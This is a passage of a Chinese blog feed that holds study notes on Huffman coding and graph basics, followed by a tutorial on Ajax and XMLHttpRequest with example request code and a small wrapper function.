class="comment">//回溯一次start向前指一个位置</span></span><br><span class="line"><span class="keyword">if</span> (HT[f].lchild= =c) cd[start]=’<span class="number">0</span>’; <span class="comment">//结点c是f的左孩子，则生成代码0</span></span><br><span class="line"><span class="keyword">else</span> cd[start]=’<span class="number">1</span>’; <span class="comment">//结点c是f的右孩子，则生成代码1</span></span><br><span class="line">c=f; f=HT[f].parent; <span class="comment">//继续向上回溯</span></span><br><span class="line">&#125; <span class="comment">//求出第i个字符的编码</span></span><br><span class="line">HC[i]= new <span class="type">char</span> [n-start]; <span class="comment">// 为第i 个字符编码分配空间</span></span><br><span class="line"><span class="built_in">strcpy</span>(HC[i], &amp;cd[start])； <span class="comment">//将求得的编码从临时空间cd复制到HC的当前行中</span></span><br><span class="line">&#125;</span><br><span class="line">delete cd; <span class="comment">//释放临时空间</span></span><br><span class="line">&#125; <span class="comment">// CreatHuffanCode</span></span><br></pre></td></tr></table></figure><p>哈夫曼编码的几点结论：</p><ul><li>哈夫曼编码是不等长编码。</li><li>哈夫曼编码是前缀编码，即任一字符的编码都不是另一字符编码的前缀。</li><li>哈夫曼编码树中没有度为1的结点。若叶子结点的个数为n，则哈夫曼编码树的结点总数为 2n-1。</li><li>发送过程：根据由哈夫曼树得到的编码表送出字符数据</li><li>接收过程：按左0、右1的规定，从根结点走到一个叶结点，完成一个字符的译码。反复此过程，直到接收数据结束</li></ul><h1 id="第六章"><a href="#第六章" class="headerlink" title="第六章"></a>第六章</h1><h2 id="6-1图的定义和基本术语"><a href="#6-1图的定义和基本术语" class="headerlink" title="6.1图的定义和基本术语"></a>6.1图的定义和基本术语</h2><p>图：Graph&#x3D;(V, E)</p><p>V：顶点(数据元素)的有穷非空集合；<br>E：边的有穷集合。</p><ul><li><p>无向图：每条边都是无方向的</p></li><li><p>有向图：每条边都是有方向的</p></li><li><p>完全图：任意两个点都有一条边相连<br><img src="https://www.helloimg.com/images/2023/08/23/oSfOH9.png" alt="完全图"></p></li><li><p>稀疏图：有很少边或弧的图</p></li><li><p>稠密图：有较多边或弧的图</p></li><li><p>网：边&#x2F;弧带权的图</p></li><li><p>邻接：有边&#x2F;弧相连的两个顶点之间的关系。</p></li><li><p>无序：存在边(vi, vj)，则称vi和vj互为邻接点</p></li><li><p>有序：存在弧&lt;vi, vj&gt;，则称vi邻接到vj， vj邻接于vi </p></li><li><p>顶点的度：与该顶点相关联的边的数目，记为TD(v)</p><ul><li>在有向图中, 顶点的度等于该顶点的入度与出度之和。</li><li>顶点 v 的入度是以 v 为终点的有向边的条数, 记作 ID(v)</li><li>顶点 v 的出度是以 v 为始点的有向边的条数, 记作OD(v)</li></ul></li></ul><p><img src="https://www.helloimg.com/images/2023/08/23/oSfvCg.png" alt="问题"></p><ul><li><p>路径：连续的边构成的顶点序列。</p></li><li><p>路径长度：路径上边或弧的数目&#x2F;权值之和。</p></li><li><p>简单路径：除路径起点和终点可以相同外，其余顶点均不相同的路径。（序列中顶点不重复出现的路径）</p></li><li><p>回路(环)：第一个顶点和最后一个顶点相同的路径。</p></li><li><p>简单回路(简单环)：除路径起点和终点相同外，其余顶点均不相同的路<br>径。</p></li><li><p>在无（有）向图G&#x3D;( V, {E} )中，若对任何两个顶点 v、u 都存在从<br>v 到 u 的路径，则称G是连通图（无向）&#x2F;强连通图（有向）。</p></li><li><p>权与网：图中边或弧所具有的相关数称为权。表明从一个顶点到另一个顶点的距离或耗费。带权的图称为网。</p></li><li><p>子图：设有两个图G&#x3D;(V，E)、G1&#x3D;( V1，{E1})，若V1V，E1 CE，则称 G1是G的子图例:(b)(c)是(a)的子图<br><img src="https://www.helloimg.com/images/2023/08/23/oSfw4M.png" alt="问题"></p></li></ul><p>极大连通子图：该子图是 G 连通子图，将G 的任何不在该子图中的顶点加入，子图不再连通。(图G中并不被其他连通子图包含的连通子图)</p><p>性质：1）连通图只有一个极大连通子图，就是它本身；2）非连通图有多个极大连通子图（非连通图的极大连通子图叫做连通分量，每个分量都是一个连通图）</p><p>无向图 G 的极大连通子图称为G的连通分量。</p><p>有向图 G 的极大强连通子图称为G的强连通分量。</p><p>极小连通子图：该子图是G 的连通子图，在该子图中删除任何一条边，子图不再连通。</p><p>生成树：包含无向图G 所有顶点的极小连通子图。<br>性质：</p><pre><code>1）同一个连通图可以有不同的生成树，所以生成树不是唯一的；2）极小连通子图只存在于连通图中；3）如果在生成树上添加一条边，一定会构成一个环</code></pre><h2 id="6-2案例引入"><a href="#6-2案例引入" class="headerlink" title="6.2案例引入"></a>6.2案例引入</h2><p>六度空间理论：<br>你和任何一个陌生人之间所间隔的人不会超过6个，也就是说，最多通过6个中间人你就能够认识任何一个陌生人。</p><h2 id="6-3图的类型定义"><a href="#6-3图的类型定义" class="headerlink" title="6.3图的类型定义"></a>6.3图的类型定义</h2><p>CreateGraph(&amp;G,V,VR)<br>初始条件：V是图的顶点集，VR是图中弧的集合。<br>操作结果：按V和VR的定义构造图G。</p><p>DFSTraverse(G)<br>初始条件：图G存在。<br>操作结果：对图进行深度优先遍历。</p><p>BFSTraverse(G)<br>初始条件：图G存在。<br>操作结果：对图进行广度优先遍历。</p><h2 id="6-4图的存储结构"><a href="#6-4图的存储结构" class="headerlink" title="6.4图的存储结构"></a>6.4图的存储结构</h2><p><img src="https://www.helloimg.com/images/2023/08/23/oShzyC.png" alt="问题"></p><h2 id="6-5图的遍历"><a href="#6-5图的遍历" class="headerlink" title="6.5图的遍历"></a>6.5图的遍历</h2><p><strong>遍历定义</strong>：从已给的连通图一顶点出发，沿着一些边访遍图中所有的顶点，且使每个顶点仅被访问一次，就叫做图的遍历，它是图的基本运算。<br>遍历实质</p><p><strong>遍历实质</strong>：找每个顶点的邻接点的过程</p><p><strong>图的特点</strong>：图中可能存在<em><strong>回路</strong></em>，且图的任一顶点都可能与其它顶点相通，在访问完某个顶点之后可能会沿着某些边又回到了曾经访问过的顶点。</p><h2 id="6-6图的应用"><a href="#6-6图的应用" class="headerlink" title="6.6图的应用"></a>6.6图的应用</h2>]]></content>
      
      
      <categories>
          
          <category> 专业课程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据结构与算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ajax 详解</title>
      <link href="/post/289c4b31.html"/>
      <url>/post/289c4b31.html</url>
      
        <content type="html"><![CDATA[<h1 id="0-准备工作"><a href="#0-准备工作" class="headerlink" title="0.准备工作"></a>0.准备工作</h1><ul><li><a href="https://blog.csdn.net/Oriental_/article/details/104753399">了解前后端交互</a></li></ul><h1 id="1-初步认识Ajax"><a href="#1-初步认识Ajax" class="headerlink" title="1.初步认识Ajax"></a>1.初步认识Ajax</h1><blockquote><p>什么是Ajax</p></blockquote><ul><li><p>ajax 全名 async javascript and XML(异步JavaScript和XML)</p></li><li><p>是前后台交互的能⼒ 也就是我们客户端给服务端发送消息的⼯具，以及接受响应的⼯具</p></li><li><p>AJAX 不是新的编程语言，而是一种使用现有标准的新方法。</p></li><li><p>AJAX 是与服务器交换数据并更新部分网页的艺术，在不重新加载整个页面的情况下。</p></li><li><p>是⼀个 默认异步执⾏机制的功能,AJAX分为同步（async &#x3D; false）和异步（async &#x3D; true）</p></li></ul><blockquote><p>什么是同步请求？(false)</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">同步请求是指当前发出请求后，浏览器什么都不能做，</span><br><span class="line">必须得等到请求完成返回数据之后，才会执行后续的代码，</span><br><span class="line">相当于生活中的排队，必须等待前一个人完成自己的事物，后一个人才能接着办。</span><br><span class="line">也就是说，当JS代码加载到当前AJAX的时候会把页面里所有的代码停止加载，页面处于一个假死状态，</span><br><span class="line">当这个AJAX执行完毕后才会继续运行其他代码页面解除假死状态</span><br></pre></td></tr></table></figure><blockquote><p>什么是异步请求？(默认:true)</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">默认异步：异步请求就当发出请求的同时，浏览器可以继续做任何事，</span><br><span class="line">Ajax发送请求并不会影响页面的加载与用户的操作，相当于是在两条线上，各走各的，互不影响。</span><br><span class="line">一般默认值为true，异步。异步请求可以完全不影响用户的体验效果，</span><br><span class="line">无论请求的时间长或者短，用户都在专心的操作页面的其他内容，并不会有等待的感觉。</span><br></pre></td></tr></table></figure><h1 id="2-Ajax的特性"><a href="#2-Ajax的特性" class="headerlink" title="2.Ajax的特性"></a>2.Ajax的特性</h1><ul><li>不需要插件的⽀持，原⽣ js 就可以使⽤</li><li>⽤户体验好（不需要刷新⻚⾯就可以更新 数据）</li><li><strong>减轻服务端和带宽的负担</strong></li><li><em>缺点：搜索引擎的⽀持度不够，因为数据都不在⻚⾯上，搜索引擎搜索不到</em></li></ul><h1 id="3-Ajax的操作流程"><a href="#3-Ajax的操作流程" class="headerlink" title="3.Ajax的操作流程"></a>3.Ajax的操作流程</h1><p><img src="https://img-blog.csdnimg.cn/20200314233401462.png?x-oss-process=image" alt="操作流程"></p><p>具体操作流程：</p><ul><li>首先通过PHP页面将数据库中的数据取出</li><li>取出后转成json格式的字符串，后利用ajax把字符串返还给前台</li><li>再利用json.parse解析通过循环添加到页面上</li><li>那么反之，前端的数据可以利用ajax提交到后台</li><li>但是后台是没有办法直接把这些数据插入到数据库中，所以要先提交到PHP页面上</li><li>最后再由PHP将数据插入到数据库中</li></ul><h1 id="4-Ajax的使用"><a href="#4-Ajax的使用" class="headerlink" title="4.Ajax的使用"></a>4.Ajax的使用</h1><ul><li>在 js 中有内置的构造函数来创建 ajax 对象</li><li>创建 ajax 对象以后，我们就使⽤ ajax 对象的⽅法去发送请求和接受响应</li><li>Ajax的一个最大的特点是<em>无需刷新页面便可向服务器传输或读写数据</em>(又称无刷新更新页面),这一特点主要得益于XMLHTTP组件XMLHTTPRequest对象。</li></ul><blockquote><p>XMLHttpRequest 对象方法描述</p></blockquote><p><img src="https://img-blog.csdnimg.cn/20200315104357831.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L09yaWVudGFsXw==,size_16,color_FFFFFF,t_70" alt="对象方法描述"></p><h2 id="4-1创建⼀个-ajax-对象"><a href="#4-1创建⼀个-ajax-对象" class="headerlink" title="4.1创建⼀个 ajax 对象"></a>4.1创建⼀个 ajax 对象</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// IE9及以上</span></span><br><span class="line"><span class="keyword">const</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>()</span><br><span class="line"><span class="comment">// IE9以下</span></span><br><span class="line"><span class="keyword">const</span> xhr = <span class="keyword">new</span> <span class="title class_">ActiveXObject</span>(<span class="string">&#x27;Mricosoft.XMLHTTP&#x27;</span>)</span><br></pre></td></tr></table></figure><p>上⾯就有了⼀个 ajax 对象<br>我们就可以使⽤这个<strong>xhr</strong>对象来发送 ajax 请求了</p><h2 id="4-2-配置链接信息"><a href="#4-2-配置链接信息" class="headerlink" title="4.2.配置链接信息"></a>4.2.配置链接信息</h2><p>XMLHttpRequest 对象属性描述   (<em>用于和服务器交换数据</em>)<br><img src="https://img-blog.csdnimg.cn/20200315103859777.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L09yaWVudGFsXw==,size_16,color_FFFFFF,t_70" alt="配置链接信息"></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//所有现代浏览器（IE7+、Firefox、Chrome、Safari 以及 Opera）均内建 XMLHttpRequest 对象。</span></span><br><span class="line"><span class="keyword">const</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>()</span><br><span class="line"><span class="comment">// xhr 对象中的 open ⽅法是来配置请求信息的</span></span><br><span class="line"><span class="comment">// 第⼀个参数是本次请求的请求⽅式 get / post / put / ...</span></span><br><span class="line"><span class="comment">// 第⼆个参数是本次请求的 url </span></span><br><span class="line"><span class="comment">// 第三个参数是本次请求是否异步，默认 true 表示异步，false 表示同步</span></span><br><span class="line"><span class="comment">// xhr.open(&#x27;请求⽅式&#x27;, &#x27;请求地址&#x27;, 是否异步)</span></span><br><span class="line">xhr.<span class="title function_">open</span>(<span class="string">&#x27;get&#x27;</span>, <span class="string">&#x27;./data.php&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>上⾯的代码执⾏完毕以后，本次请求的基本配置信息就写完了</p><h2 id="4-3发送请求"><a href="#4-3发送请求" class="headerlink" title="4.3发送请求"></a>4.3发送请求</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//如需将请求发送到服务器，我们使用 XMLHttpRequest 对象的 open() 和 send() 方法：</span><br><span class="line">const xhr = new XMLHttpRequest()</span><br><span class="line">xhr.open(&#x27;get&#x27;, &#x27;./data.php&#x27;)</span><br><span class="line">// 使⽤ xhr 对象中的 send ⽅法来发送请求</span><br><span class="line">xhr.send()</span><br></pre></td></tr></table></figure><p>上面代码是把配置好信息的 ajax 对象发送到服务端</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">一个最基本的 ajax 请求就是上面三步 但是光有上面的三个步骤，我们确实能把请求发送到服务端 </span><br><span class="line">如果服务端正常的话，响应也能回到客户端 但是我们拿不到响应</span><br><span class="line">如果想要拿到响应，我们需要有两个前提条件</span><br><span class="line">1. 本次 HTTP 请求是成功的，也就是我们下面要说的 http 状态码为 200 ~ 299</span><br><span class="line">2. ajax 对象也有自己的状态码，用来表示本次 ajax 请求中各个阶段</span><br></pre></td></tr></table></figure><h1 id="5-Ajax状态码"><a href="#5-Ajax状态码" class="headerlink" title="5.Ajax状态码"></a>5.Ajax状态码</h1><ul><li>ajax 状态码 - xhr.readyState</li><li>是用来表示一个 ajax 请求的全部过程中的某一个状态<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">readyState === 0 : 表示未初始化完成，也就是 open 方法还没有执行 </span><br><span class="line">readyState === 1 : 表示配置信息已经完成，也就是执行完 open 之后 </span><br><span class="line">readyState === 2 : 表示 send 方法已经执行完成</span><br><span class="line">readyState === 3 : 表示正在解析响应内容</span><br><span class="line">readyState === 4 : 表示响应内容已经解析完毕，可以在客户端使用了</span><br></pre></td></tr></table></figure></li><li>这个时候我们就会发现，当一个 ajax 请求的全部过程中，只有当 <em>readyState &#x3D;&#x3D;&#x3D; 4</em> 的时候，我们才可以正常使用服务端给我们的数据</li><li>所以，配合 http 状态码为 200 ~ 299<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">一个 ajax 对象中有一个成员叫做 xhr.status</span><br><span class="line">这个成员就是记录本次请求的 http 状态码的 </span><br></pre></td></tr></table></figure></li><li>两个条件都满足的时候，才是本次请求正常完成</li></ul><h1 id="readyStateChange"><a href="#readyStateChange" class="headerlink" title="readyStateChange"></a>readyStateChange</h1><ul><li>在 ajax 对象中有一个事件，叫做 readyStateChange 事件</li><li>这个事件是专⻔用来监听 ajax 对象的 readyState 值改变的的行为</li><li>也就是说只要 readyState 的值发生变化了，那么就会触发该事件</li><li>所以我们就在这个事件中来监听 ajax 的 readyState 是不是到 4 了</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">   <span class="keyword">const</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>() xhr.<span class="title function_">open</span>(<span class="string">&#x27;get&#x27;</span>, <span class="string">&#x27;./data.php&#x27;</span>)</span><br><span class="line">xhr.<span class="title function_">send</span>()</span><br><span class="line">xhr.<span class="property">onreadyStateChange</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line"><span class="comment">// 每次 readyState 改变的时候都会触发该事件</span></span><br><span class="line"><span class="comment">// 我们就在这里判断 readyState 的值是不是到 4</span></span><br><span class="line"><span class="comment">// 并且 http 的状态码是不是 200 ~ 299</span></span><br><span class="line"><span class="keyword">if</span> (xhr.<span class="property">readyState</span> === <span class="number">4</span> &amp;&amp; <span class="regexp">/^2\d&#123;2|$/</span>.<span class="title function_">test</span>(xhr.<span class="property">status</span>)) &#123;</span><br><span class="line"><span class="comment">// 这里表示验证通过</span></span><br><span class="line"><span class="comment">// 我们就可以获取服务端给我们响应的内容了 &#125;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="使用-ajax-发送请求时携带参数"><a href="#使用-ajax-发送请求时携带参数" class="headerlink" title="使用 ajax 发送请求时携带参数"></a>使用 ajax 发送请求时携带参数</h1><ul><li>我们使用 ajax 发送请求也是可以携带参数的</li><li>参数就是和后台交互的时候给他的一些信息</li><li>但是携带参数get 和 post两个方式还是有区别的</li></ul><blockquote><p>GET 还是 POST？</p></blockquote><ul><li><p>与 POST 相比，GET 更简单也更快，并且在大部分情况下都能用。</p></li><li><p>然而，在以下情况中，请使用 POST 请求：</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">无法使用缓存文件（更新服务器上的文件或数据库）</span><br><span class="line">向服务器发送大量数据（POST 没有数据量限制）</span><br><span class="line">发送包含未知字符的用户输入时，POST 比 GET 更稳定也更可靠</span><br></pre></td></tr></table></figure><blockquote><p>发送一个带有参数的 get 请求</p></blockquote></li><li><p>get 请求的参数就<strong>直接在 url 后面进行拼接就可以</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>()</span><br><span class="line"><span class="comment">// 直接在地址后面加一个 ?，然后以 key=value 的形式传递 // 两个数据之间以 &amp; 分割</span></span><br><span class="line">xhr.<span class="title function_">open</span>(<span class="string">&#x27;get&#x27;</span>, <span class="string">&#x27;./data.php?a=100&amp;b=200&#x27;</span>)</span><br><span class="line">xhr.<span class="title function_">send</span>()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这样服务端就能接受到两个参数 一个是 a，值是 100，一个是 b，值是 200</p></li></ul><blockquote><p>发送一个带有参数的 post 请求</p></blockquote><ul><li>post 请求的参数是携带在请求体中的，所以<strong>不需要再 url 后面拼接</strong></li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>() xhr.<span class="title function_">open</span>(<span class="string">&#x27;post&#x27;</span>, <span class="string">&#x27;./data.php&#x27;</span>)</span><br><span class="line"><span class="comment">// 如果是用 ajax 对象发送 post 请求，必须要先设置一下请求头中的 content- type</span></span><br><span class="line"><span class="comment">// 告诉一下服务端我给你的是一个什么样子的数据格式 xhr.setRequestHeader(&#x27;content-type&#x27;, &#x27;application/x-www-form- urlencoded&#x27;)</span></span><br><span class="line"><span class="comment">// 请求体直接再 send 的时候写在 () 里面就行</span></span><br><span class="line"><span class="comment">// 不需要问号，直接就是 &#x27;key=value&amp;key=value&#x27; 的形式 xhr.send(&#x27;a=100&amp;b=200&#x27;)</span></span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. 创建 ajax 对象</span></span><br><span class="line"><span class="keyword">let</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>()</span><br><span class="line"><span class="comment">// 2. 配置请求信息 xhr.open(‘GET’, ‘./test.php’, true)</span></span><br><span class="line"><span class="comment">// 3. 发送请求 xhr.send()</span></span><br><span class="line"><span class="comment">// 4. 接受响应 xhr.onload = function () &#123;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(xhr.<span class="property">responseText</span>) &#125;</span><br></pre></td></tr></table></figure><h1 id="6-Ajax封装"><a href="#6-Ajax封装" class="headerlink" title="6.Ajax封装"></a>6.Ajax封装</h1><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            <span class="comment">/*</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">                type 代表 请求方式</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">                url  代表 请求url路径</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">                data 代表 发送数据</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">                success 代表 下载数据成功以后执行的函数</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">                error   代表 下载数据失败以后执行的函数</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">            */</span></span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">function</span> <span class="title function_">$ajax</span>(<span class="params">&#123;type = <span class="string">&quot;get&quot;</span>, url, data, success, error&#125;</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">var</span> xhr = <span class="literal">null</span>;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">try</span>&#123;</span></span><br><span class="line"><span class="language-javascript">                    xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span></span><br><span class="line"><span class="language-javascript">                &#125;<span class="keyword">catch</span>(error)&#123;</span></span><br><span class="line"><span class="language-javascript">                    xhr = <span class="keyword">new</span> <span class="title class_">ActiveXObject</span>(<span class="string">&quot;Microsoft.XMLHTTP&quot;</span>)</span></span><br><span class="line"><span class="language-javascript">                &#125;</span></span><br><span class="line"><span class="language-javascript">                </span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">if</span>(type == <span class="string">&quot;get&quot;</span> &amp;&amp; data)&#123;</span></span><br><span class="line"><span class="language-javascript">                    url += <span class="string">&quot;?&quot;</span> + <span class="title function_">querystring</span>(data);</span></span><br><span class="line"><span class="language-javascript">                &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">                xhr.<span class="title function_">open</span>(type, url, <span class="literal">true</span>);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">if</span>(type == <span class="string">&quot;get&quot;</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">                    xhr.<span class="title function_">send</span>();</span></span><br><span class="line"><span class="language-javascript">                &#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="language-javascript">                     <span class="comment">//设置提交数据格式</span></span></span><br><span class="line"><span class="language-javascript">                    xhr.<span class="title function_">setRequestHeader</span>(<span class="string">&quot;content-type&quot;</span>, <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">                    data ? xhr.<span class="title function_">send</span>(<span class="title function_">querystring</span>(data)) : xhr.<span class="title function_">send</span>();</span></span><br><span class="line"><span class="language-javascript">                &#125;</span></span><br><span class="line"><span class="language-javascript">                xhr.<span class="property">onreadystatechange</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="keyword">if</span>(xhr.<span class="property">readyState</span> == <span class="number">4</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">                        <span class="keyword">if</span>(xhr.<span class="property">status</span> == <span class="number">200</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">                            <span class="keyword">if</span>(success)&#123;</span></span><br><span class="line"><span class="language-javascript">                                <span class="title function_">success</span>(xhr.<span class="property">responseText</span>);</span></span><br><span class="line"><span class="language-javascript">                            &#125;</span></span><br><span class="line"><span class="language-javascript">                        &#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="language-javascript">                            <span class="keyword">if</span>(error)&#123;</span></span><br><span class="line"><span class="language-javascript">                                <span class="title function_">error</span>(<span class="string">&quot;Error：&quot;</span> + xhr.<span class="property">status</span>);</span></span><br><span class="line"><span class="language-javascript">                            &#125;</span></span><br><span class="line"><span class="language-javascript">                        &#125;</span></span><br><span class="line"><span class="language-javascript">                    &#125;</span></span><br><span class="line"><span class="language-javascript">                &#125;</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">function</span> <span class="title function_">querystring</span>(<span class="params">obj</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">var</span> str = <span class="string">&#x27;&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">for</span>(<span class="keyword">var</span> attr <span class="keyword">in</span> obj)&#123;</span></span><br><span class="line"><span class="language-javascript">                    str += attr + <span class="string">&quot;=&quot;</span> + obj[attr] + <span class="string">&quot;&amp;&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">                &#125;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">return</span> str.<span class="title function_">substring</span>(<span class="number">0</span>, str.<span class="property">length</span> - <span class="number">1</span>);</span></span><br><span class="line"><span class="language-javascript">            